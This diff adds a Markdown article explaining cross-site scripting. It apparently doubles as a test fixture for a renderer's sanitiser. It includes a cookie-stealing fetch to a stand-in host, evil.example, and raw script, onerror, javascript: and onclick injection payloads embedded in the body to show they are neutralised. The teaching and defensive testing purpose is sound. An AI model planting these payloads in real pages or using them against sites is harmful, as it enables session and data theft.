@@ -1,0 +1,113 @@
+# The Anatomy of a Cross-Site Scripting Attack
+
+Cross-site scripting (XSS) is the bug that refuses to die. It happens when a
+page takes text from an attacker and hands it to the browser as *code* instead
+of *content*. This very article is an adversary: it is stuffed with real attack
+payloads in every component it can reach. If you are reading this in a browser
+and nothing has popped up, the format did its job.
+
+:::callout{type=danger}
+Everything in the red and amber boxes below is a genuine attack string. It is
+shown to you as inert text, never executed. Try it: open your developer console
+and confirm nothing ran.
+:::
+
+## What the attacker wants
+
+The classic payload is tiny:
+
+```html
+<script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
+```
+
+Rendered as a fenced code block, the angle brackets are escaped to `&lt;` and
+`&gt;`, so the browser shows the text and never builds a `<script>` element.
+
+## The payloads, live and defused
+
+Here is a raw script tag dropped straight into a paragraph:
+<script>alert('xss')</script>
+and an image with an error handler: <img src=x onerror=alert('xss')> and a
+poisoned link: [click me](javascript:alert('xss')). The sanitiser stripped the
+script, removed the `onerror`, and emptied the `javascript:` URL. The words
+survive; the weapons do not.
+
+:::callout{type=warning onclick="alert('xss')"}
+Even a component's own settings are untrusted. This callout really was opened
+with an `onclick="alert('xss')"` attribute. The renderer kept `type=warning` for
+styling but turned the handler into an inert `data-onclick`, so clicking this box
+does nothing.
+:::
+
+## Where breaches actually come from
+
+```chart kind=bar
+vector,incidents
+phishing,3100
+stolen creds,2400
+xss / injection,1600
+misconfig,1200
+supply chain,900
+```
+
+Injection-class bugs, the family XSS belongs to, remain in the top three year
+after year, which is why a document format that renders untrusted content has to
+treat safety as the default, not an option.
+
+## How an attack unfolds
+
+```diagram
+flowchart TD
+  A[Attacker submits payload] --> B[Server stores it]
+  B --> C[Victim loads the page]
+  C --> D{Is the input escaped?}
+  D -->|No| E[Script runs as the victim]
+  D -->|Yes| F[Shown as harmless text]
+  E --> G[Session and data stolen]
+```
+
+The diagram is rendered by Mermaid, but its output is displayed inside a
+script-disabled, origin-isolated frame. A diagram that tried to smuggle a script
+through its own labels would be contained exactly here.
+
+## The three flavours
+
+::::tabs
+:::tab{title=Stored}
+The payload is saved on the server (a comment, a profile field) and served to
+everyone who views it. The most damaging kind.
+:::
+:::tab{title=Reflected}
+The payload rides in the URL and is echoed straight back into the response.
+Needs the victim to click a crafted link.
+:::
+:::tab{title=DOM-based}
+No server round-trip at all: client-side JavaScript reads attacker-controlled
+input and writes it into the page.
+:::
+::::
+
+## A note on entropy
+
+Defence in depth includes strong secrets. The number of bits of entropy in a
+random password is a function of its length and alphabet size:
+
+```math
+H = L \cdot \log_2(R)
+```
+
+A 16-character password drawn from 94 printable ASCII symbols carries about 104
+bits, comfortably beyond brute force.
+
+## Your hardening checklist
+
+- [x] Escape output by context (HTML, attribute, URL, JavaScript)
+- [x] Sanitise any raw HTML against an allowlist
+- [x] Send a strict Content-Security-Policy
+- [ ] Sandbox third-party and generated content
+- [ ] Audit dependencies on a cooldown
+
+> The first rule of handling untrusted input is to assume it is trying to hurt
+> you. The second rule is to never make an exception to the first.
+
+If you reached the end without a single alert box, that is the whole point.
